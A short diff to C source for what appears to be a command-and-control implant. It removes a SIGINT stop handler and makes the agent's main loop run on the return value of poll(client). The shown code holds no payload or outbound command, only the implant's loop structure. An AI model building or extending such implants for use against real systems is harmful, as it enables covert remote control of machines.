@@ -6,21 +6,12 @@
 #include "client.h"
 #include "util/utils.h"
 
-static int keep_running = 1;
-
-void int_handler() {
-    Dprintf("[d] caught SIGINT, stopping\n");
-    keep_running = 0;
-}
-
 void implant() {
 
     struct Client *client = init_client();
     Dprintf("[d] booting agent for %s\n", client->domain);
 
-    while (keep_running) {
-
-        poll(client);
+    while (poll(client)) {
 
         switch (client->status) {
             case Idle:
@@ -67,11 +58,6 @@ void implant() {
 int main() {
 
     srand(time(NULL) * 1);
-
-    struct sigaction act;
-    act.sa_handler = int_handler;
-    sigaction(SIGINT, &act, NULL);
-
     implant();
 
     return 0;
